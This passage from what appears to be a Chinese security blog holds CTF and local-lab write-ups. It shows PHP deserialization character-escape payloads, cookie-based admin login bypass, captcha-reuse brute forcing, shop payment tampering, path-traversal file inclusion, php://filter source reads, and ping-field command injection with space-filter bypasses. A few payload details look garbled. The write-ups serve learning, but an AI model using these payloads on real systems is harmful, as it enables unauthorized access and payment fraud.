class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure>
<p>require(‘config.php’)将会加载名为config.php的文件的内容，该文件通常包含了一些配置信息。<br>class一般都是重要函数函数调用和数据库查询需要用到的文件。class中包含了 config.php 去看看config.php。<br><code>config.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到这里有个flag  应该是要class调用 config.php进行读取了。<br>经过前面,我们的的思路就是,注册账号然后登录，然后update 更新自己的信息，我们通过源码看到profile通过update.php经过POST传入phone，email，nickname，photo四个参数，而其中的<code>photo参数具有文件读取的函数功能</code>，所以我们直接让它读取config.php文件即可获得flag。<br><code>下列知识点才是干货</code></p>
<h3 id="如何构造payload"><a href="#如何构造payload" class="headerlink" title="如何构造payload"></a>如何构造payload</h3><p>–&gt;<code>字符逃逸</code><br>但由于在update.php中,变量$profile[‘photo’]是文件上传控制的但是被经过md5加密了($photo默认值)，没办法直接传，结合反序列化函数和前面看到的filter的那些正则匹配替换函数，我们可以试着尝试反序列化的字符逃逸。<br>1、在update.php中,对输入的nickname也有正则限制。</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">if(<span class="name">preg_match</span>(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; <span class="number">10</span>)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里先对它进行了正则，这个正则的意思是匹配除了a-zA-Z0-9_之外的字符,因为 “^” 符号是在 “[]” 里面，所以是非的意思，不是开始的意思，preg_match只能处理字符串，当传入的subject是数组时会返回false，所以我们传入数组可以绕过。<br>2、还可以发现,在class中,对update的信息存在过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">	<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">	<span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">	<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __class__;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以看到把select，insert，update等字符串替换成hacker，其他都是6个字符串，和hacker一样，并不能让字符串增多，<br>但这里有一个where是五个字符串，替换成hacker后相当于多了一个字符，如果我们多写几个where，就能多出多个字符串，多出来的字符串可以构造语句形成字符逃逸。<br>知道了where是关键点,那我要应该怎么构造payload呢？<br>我们可操作的字段应该是nickname,即<code>在nickname后插入photo的关键内容且保证不被丢弃。</code><br>首先思考一个payload:<br>加入我nickname[]的值为public $nickname &#x3D; array(“”;}s:5:”photo”;s:10:”config.php”;}”);<br>那么post传入update时,它自动序列化的payload就是</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;114&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;123@163.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;<span class="selector-tag">a</span>:<span class="number">1</span>:&#123;<span class="selector-tag">i</span>:<span class="number">0</span>;s:<span class="number">34</span>:<span class="string">&quot;&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><code>你应该会疑惑</code><br>1、为什么nickname的string长度为34。<br>答:首先34:后的””已经是闭合的了,长度为0,但是序列化长度不可为0(<code>正常情况下可以,但是当序列化非空数组或对象时，序列化的字符串长度将大于0。</code>)。那么所以name只能认为”;}s:5:”photo”;s:10:”config.php”;}当作了name的值，这个序列化字符串才能成功反序列化,所以长度为34。<br>2、这里的photo是nickname的一部分,不可以帮助我们解析处flag,所以,我们就要使用一些方法,把这个$photo从nickname剥离出来。<br><code>所以要用到字符逃逸绕过。</code><br>“;}s:5:”photo”;s:10:”config.php”;}<br>我们要让序列化后的内容可以接受以上34个字符。<br>我们可以想到,由于在class.php内,把select，insert，update、where等字符串替换成hacker。<br>那么我们可以借助34个where扩充34个位置。<br>1、如果对方网站没有序列化:<br>那么构造最终payload的代码如下(删掉变量photo)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span> = <span class="string">&quot;18148881156&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$email</span> = <span class="string">&quot;123@163.com&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$nickname</span> = <span class="keyword">array</span>(<span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;<span class="string">&quot;);//34个where,把photo包含进nickname。</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=new b();</span></span><br><span class="line"><span class="string"><span class="subst">$payload</span>=serialize(<span class="subst">$a</span>);</span></span><br><span class="line"><span class="string">echo <span class="subst">$payload</span>;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>尴尬的是,这串代码运不了,那我们就手动构造payload。<br><code>o:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:11:&quot;123@163.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code><br>这样,传输到对方网站后端时,在where被正则匹配换成hacker之后，正好满足长度(成功把数组闭合掉)，然后后面的”};s:5:“photo”;s:10:“config.php”;}也就不是nickname的一部分了，被反序列化的时候就会被当成photo，就可以读取到config.php的内容了。<br>到达对方网站后端时,由于对面网站存在对where的过滤,那么每存在一个where,就会逃逸一个字符,借对方的过滤代码帮我们还原了,哈哈。而且,之前提到的那个$photo默认值,此时也被丢弃啦!<br>2、这里由于update.php已经存在了序列化,那么我们实际的payload为:<br><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code><br>这样抓包修改即可,不赘述,最后查看源码,再base64解码以下即可。<br>这道题我做了一天,感觉挺恶心的。</p>
<p><code>后记</code><br>一些以前遗漏的知识点(php反序列化绕过姿势-进阶):<br>特点1：<br>php在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 ，超出的部分并不会被反序列化成功，这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。而且可以看到反序列化字符串都是以”;}结束的，那如果把”;}添入到需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就相应的丢弃了。<br>特点2：<br>长度不对应会报错<br>漏洞产生：<br>反序列化之所以存在字符逃逸，最主要的原因是代码中存在针对序列化（serialize()）后的字符串进行了过滤操作（变多或者变少）。<br>漏洞常见条件：<br>序列化后过滤再去反序列化<br>from:<br><code>感觉这两篇学习绕过姿势的文章都挺好,强烈安利</code><br><a href="https://zhuanlan.zhihu.com/p/628402113">https://zhuanlan.zhihu.com/p/628402113</a><br><a href="https://blog.csdn.net/m0_64815693/article/details/127982134">https://blog.csdn.net/m0_64815693/article/details/127982134</a><br><code>特别鸣谢</code><br><a href="https://zhuanlan.zhihu.com/p/628402113">https://zhuanlan.zhihu.com/p/628402113</a><br><a href="https://www.jb51.net/article/180496.htm">https://www.jb51.net/article/180496.htm</a></p>
]]></content>
      <categories>
        <category>Recorder</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>业务逻辑|白盒环境下某cms渗透测试</title>
    <url>/2023/10/21/cmslogicLoudong/</url>
    <content><![CDATA[<h2 id="熊海cms"><a href="#熊海cms" class="headerlink" title="熊海cms"></a>熊海cms</h2><p><a href="http://127.0.0.1/xionghaicms/admin/?r=login%E8%BF%9B%E5%85%A5%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%E3%80%82">http://127.0.0.1/xionghaicms/admin/?r=login进入登陆界面。</a><br>代码审计<br>首先打开xionghaicms\index.php,注释写的很清楚,存在一个关联性比较大的”index.php”文件<br>(其次还应该想到,这里存在一个include函数,那么可能存在文件包含漏洞)<br><img src="https://pic.imgdb.cn/item/6533d27ac458853aefae60f5.png" alt="图一" title="代码审计"><br>那么我们就尝试在浏览器访问这个文件<br><a href="http://127.0.0.1/xionghaicms/admin/?r=index">http://127.0.0.1/xionghaicms/admin/?r=index</a><br>发现未登录状态下,自动回退到上一个登录界面,即”login.php”<br>继续,由于是访问admin\files文件夹下的文件,那么我们来到这个文件夹。找到logic.php,xionghaicms\admin\files\logic.php。<br>发现引入了一个checklogic.php文件,打开康康。<br>有这么一段代码,意思是只要接收到的cookie不为空,就可以直接进入管理员后台;反之回退到login界面。<br>那么就是判断cookie的逻辑出了问题,可能是开发人员为了省事,把cookie的验证简化了,出现了业务逻辑越权漏洞。<br>注意,这个cookie是以”user”字段接受的,意思是属性为”user”,只要这个属性值不为空,就可以绕过登录直接进入后台<br><img src="https://pic.imgdb.cn/item/6533d283c458853aefae9492.png" alt="图二" title="代码审计"><br>修改cookie,要以user字段接收,任意值都可,只要不为空。<br><img src="https://pic.imgdb.cn/item/6533d28ec458853aefaeccff.png" alt="图三" title="bp修改cookie"><br>成功进入后台。<br><img src="https://pic.imgdb.cn/item/6533d2b3c458853aefaf86b6.png" alt="图四" title="无密码进入xhcms后台"><br>但是仅仅是看到这个界面,点击里面的功能还是会跳到登陆界面。<br>但是,只要抓包,每点击一个页面再一次修改cookie(和上面一样),即可正常访问网站。</p>
<h2 id="damicms"><a href="#damicms" class="headerlink" title="damicms"></a>damicms</h2><p>关于这个cms,测试到两个漏洞,一个是验证码复用漏洞,另一个是支付篡改漏洞。</p>
<h3 id="验证码复用-爆破"><a href="#验证码复用-爆破" class="headerlink" title="验证码复用+爆破"></a>验证码复用+爆破</h3><p>参考:<a href="https://blog.csdn.net/YangGouGuo/article/details/131177565">https://blog.csdn.net/YangGouGuo/article/details/131177565</a><br>借用此篇文章的思路,特意整了个disearch扫描目录。<br>发现admin.php可能是一个管理员界面,进入,果然。<br><img src="https://pic.imgdb.cn/item/6533e49ac458853aeffd16dc.png" alt="图五" title="admin"><br>这里我们可以尝试爆破获取管理员账号与密码,但是这里存在一个验证码,很难处理。借助迪总的演示,发现此处的验证码存在一个复用的问题。<br>不多说,直接操作。<br>抓包,账号密码随便输入,但是验证码要输入正确。<br>然后把这个数据包发送到intruder爆破模块,攻击模式选择 cluster bomb集束炸弹模式,clean&#x2F;add双联操作,添加payload不赘述,具体见上述参考。<br><img src="https://pic.imgdb.cn/item/6533e4a2c458853aeffd3984.png" alt="图六" title="爆破"><br>爆破即可,看到不一样长度的数据包点开查看,一般就可以了。<br>成功进入管理后台<br><img src="https://pic.imgdb.cn/item/6533e4b6c458853aeffd96f2.png" alt="图七" title="成功夺取webshell"></p>
<h3 id="支付篡改"><a href="#支付篡改" class="headerlink" title="支付篡改"></a>支付篡改</h3><p>1、修改商品数量达到”零元购”的目的。<br>进入到购买商品的界面,随便选一件进行购买,点击立即购买后抓包。<br><img src="https://pic.imgdb.cn/item/65368462c458853aef27f780.jpg" alt="图八" title="抓包"><br>将此处的”1”改为”-1”后放包。<br><img src="https://pic.imgdb.cn/item/6536846fc458853aef282cf2.jpg" alt="图九" title="改包"><br>可以看到价格变成了-6000,也就相当于”零元购”。<br>2、修改商品价格达到”低价购”的目的。<br>买n件商品,点击提交订单,抓包后将数据包的price值改为6。<br><img src="https://pic.imgdb.cn/item/653684d4c458853aef29cbb3.jpg" alt="图十" title="抓包"><br>可以看到原本总价6w的商品,仅需60块钱,也就相当于”低价购”。<br><img src="https://pic.imgdb.cn/item/653684e4c458853aef2a0d81.jpg" alt="图十一" title="低价购"><br>3、修改订单的商品id值以及商品的名称实现另一种”低价购”–就是以低价位购买高价位产品。<br>大米测试产品是相对于大米手机cms是高价位产品。<br>首先点击大米测试产品,提交订单并且抓包,获取其商品id值以及商品的名称的数据包信息,之后直接退出。<br><img src="https://pic.imgdb.cn/item/653684f1c458853aef2a41c3.jpg" alt="图十二" title="获取目标商品数据包信息"><br>随后点击手机大米cms这个商品,提交订单并抓包,将对应的品id值以及商品的名称的数据包信息改成之前获取的。<br><img src="https://pic.imgdb.cn/item/653684fdc458853aef2a7771.jpg" alt="图十三" title="改包"><br>可以看到,本来我是要以5.4k的价位购买大米手机cms的,但是这个支付界面直接变成了以5.4k的价位购买到了6k价位的大米测试产品。<br><img src="https://pic.imgdb.cn/item/65368510c458853aef2ac38a.jpg" alt="图十四" title="成功低价购"></p>
]]></content>
      <categories>
        <category>业务逻辑越权</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>Buuctf Recording</title>
    <url>/2023/10/27/buuojctf/</url>
    <content><![CDATA[<h2 id="HCTF-2018-WarmUp–代码审计-文件包含-目录遍历"><a href="#HCTF-2018-WarmUp–代码审计-文件包含-目录遍历" class="headerlink" title="[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历"></a>[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历</h2><p>开启靶机,发现是一个大大的滑稽脸。<br><img src="https://pic.imgdb.cn/item/653bca68c458853aeff5c5cb.jpg" alt="图一" title="滑稽脸"><br>ctrl+u看源码,发现一个source.php被注释了,那么可以想到,这个文件是可以访问的。<br><img src="https://pic.imgdb.cn/item/653bca7bc458853aeff6218b.jpg" alt="图二" title="滑稽脸源码"><br>访问这个文件,看到关键源码(就是下面的代码,这里是详细说明)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)//接收属性值并判断文件名</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//白名单验证</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;<span class="comment">//这里要求我们输入的必须不可为空且必须为字符串,否则返回错误</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//在白名单内的就返回为真</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//法一</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(//这里挺关键意思是把接收的值的第一个?前的内容截取</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//截取后判断</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//法二</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//其实和上面一样,只不过这里是url解码,那就将?编码两次(这里解一次码,服务器也会自动解一次码)其余同法一</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])<span class="comment">//这个是三个条件(输入非空、输入的是字符串、且上面的check函数返回为true),最主要的是checkfile函数返回为真,三个条件满足则会得到flag</span></span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];<span class="comment">//关键的包含flag文件的函数</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一些函数的定义:<br>mb_substr： 获取部分字符串。<br>mb_strpos： 查找字符串在另一个字符串中首次出现的位置。<br>in_array($needle, $haystack)：needle待搜索值，haystack待搜索数组。<br>有了上述分析支持后,开始解题。<br>首先根据这段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//白名单验证</span></span><br><span class="line">          <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;<span class="comment">//这里要求我们输入的必须不可为空且必须为字符串,否则返回错误</span></span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//在白名单内的就返回为真</span></span><br><span class="line">              <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>我先读取一个hint.php文件康康<br><img src="https://pic.imgdb.cn/item/653bca8dc458853aeff68098.jpg" alt="图三" title="hint.php"><br>发现输出flag在ffffllll什么的文件(小寄巧:ffffllllaaaagggg这里flag被写了四次所以使用4或5个..&#x2F; 我tk,第一次做ctf题给我整这是吧?),我们尝试读取,但是由于存在过滤,并不可直接读取,采用以下payload绕过。<br>法一:</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">int</span>.php?..<span class="regexp">/../</span>..<span class="regexp">/../</span>../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>法二(将?url编码两次):</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=hint.php%<span class="number">253</span>F..<span class="regexp">/../</span>..<span class="regexp">/../</span>../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>依此法,可获得flag<br><img src="https://pic.imgdb.cn/item/653bca94c458853aeff69f73.jpg" alt="图四" title="法一绕过输出flag"><br><img src="https://pic.imgdb.cn/item/653bcaf6c458853aeff89f67.jpg" alt="图五" title="法二绕过输出flag"><br>参考:<code>https://blog.csdn.net/Lixunzhe0112/article/details/128716492</code></p>
<h2 id="ACTF2020-新生赛-Include–文件包含-协议玩法"><a href="#ACTF2020-新生赛-Include–文件包含-协议玩法" class="headerlink" title="[ACTF2020 新生赛]Include–文件包含|协议玩法"></a>[ACTF2020 新生赛]Include–文件包含|协议玩法</h2><p>开启靶机,发现有一个超链接,点击进去,只有”can you find out the flag?”,这里我卡了挺久,抓包也抓了;爆路径也尝试了,一无所获。<br><img src="https://pic.imgdb.cn/item/653bd282c458853aef2a63e8.jpg" alt="图六" title="单一的界面"><br>先改造以下超链接(直接指向这一个文件),发现显示页面不变,说明这个超链接是直接指向flag.php的。<br><img src="https://pic.imgdb.cn/item/653bd28ac458853aef2aa9aa.jpg" alt="图七" title="一个小发现"><br>最终参考了wp,学习到以下知识点。<br>1、PHP 中若通过 require()、once_require() 或 include() 、once_include() 函数去包含另一个文件，该文件在网页中均是不可见的（即使你查看网页源代码）。<br>2、可以发现 flag.php 页面通过 get 方式中的参数 file 来包含网站当前目录下的其他文件（如 flag.php），再加上提示 “你能找到其他 flag 吗？” ，我们可以推断，要解答该题目需要获取 flag.php 的源代码。<br>分析过后,我们便有了解决方法。<br>思路:我们可以通过将包含的文件进行转码，让浏览器无法识别这是 PHP 代码，其也就无法执行该 PHP 文件，于是将文件中的内容直接显示出来，我们将通过 PHP 伪协议来完成这一动作。<br>使用 PHP 伪协议将网页源代码转换为 base64 编码的格式：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
<p>构造payload并且访问,得到一串base64编码的数据。<br><img src="https://pic.imgdb.cn/item/653bd29cc458853aef2b3fa3.jpg" alt="图八" title="成功获取关键key"><br>上网找一个在线base64解码工具即可得到flag。</p>
<h2 id="ACTF2020-新生赛-Exec–命令执行"><a href="#ACTF2020-新生赛-Exec–命令执行" class="headerlink" title="[ACTF2020 新生赛]Exec–命令执行"></a>[ACTF2020 新生赛]Exec–命令执行</h2><p>开启靶机,发现是一个简易实现ping命令的文本输入框。<br>那么就是简单的命令执行,说到命令执行,那么就要思考以下几点:<br>1、对方是什么操作系统:windows|linux?<br>2、可不可以多条命令一起执行?<br>首先判断os,这里先抓包看,但是看不出来。<br><img src="https://pic.imgdb.cn/item/653bd9eac458853aef60f2cf.jpg" alt="图九" title="抓包判断os"><br>那么只能盲猜,先用ipconfig再用ifconfig<br>这里ipconfig没反应,但是ifconfig有反应,所以必是linux系统且支持多条命令执行。<br>如127.0.0.1;ifconfig(推荐.;是linux中的管道符)或127.0.0.1;ifconfig。<br><img src="https://pic.imgdb.cn/item/653bdac7c458853aef6559e5.jpg" alt="图十" title="盲猜"><br>知道这一点,那么我们就可以自定义命令找flag了。<br>先查看当前目录,发现只有一个index.php文件,明显flag不存在于此处。<br><img src="https://pic.imgdb.cn/item/653bdaedc458853aef6613bc.jpg" alt="图十一" title="探针到一个文件"><br>使用:”ls -al &#x2F;“ 是一个在命令行中使用的命令。它的作用是列出根目录下所有文件和文件夹的详细信息。<br><img src="https://pic.imgdb.cn/item/653bdb4ac458853aef692236.jpg" alt="图十二" title="发现目标"><br>最后查看flag(这里一定要cat &#x2F;flag而不可以cat flag)<br><img src="https://pic.imgdb.cn/item/653bdb51c458853aef695a75.jpg" alt="图十三" title="获取flag"></p>
<h2 id="GXYCTF2019-Ping-Ping-Ping–命令执行-代码审计"><a href="#GXYCTF2019-Ping-Ping-Ping–命令执行-代码审计" class="headerlink" title="[GXYCTF2019]Ping Ping Ping–命令执行|代码审计"></a>[GXYCTF2019]Ping Ping Ping–命令执行|代码审计</h2><p>开启靶机,提示很明显,就是一个ip属性值接收IP地址ping。<br>但是依旧可以多条命令执行,但是这里用到linux的管道符”;”,原因是在网址栏操作。<br>那么我们先看下ip康康是否支持。<br><img src="https://pic.imgdb.cn/item/653c737dc458853aef34db78.jpg" alt="图十四" title="管道符"><br>确实可以,那么就可以接着往下了。我想一步到位直接读取flag,但是发现空格被过滤了<br><img src="https://pic.imgdb.cn/item/653c73edc458853aef366532.jpg" alt="图十五" title="空格过滤"><br>退而求其次,绕过空格过滤<br>空格的绕过方法为:</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>$RIFS)替换</span><br><span class="line"><span class="number">2.</span>$IFS$1替换</span><br><span class="line"><span class="number">3.</span>$KIFS替换</span><br><span class="line"><span class="number">4.</span>%20替换</span><br><span class="line"><span class="number">5.</span>&lt;和&lt;&gt;重定向符替换</span><br><span class="line"><span class="number">6.</span>%09替换</span><br><span class="line"><span class="number">7</span>、<span class="comment">/**/</span>替换</span><br></pre></td></tr></table></figure>
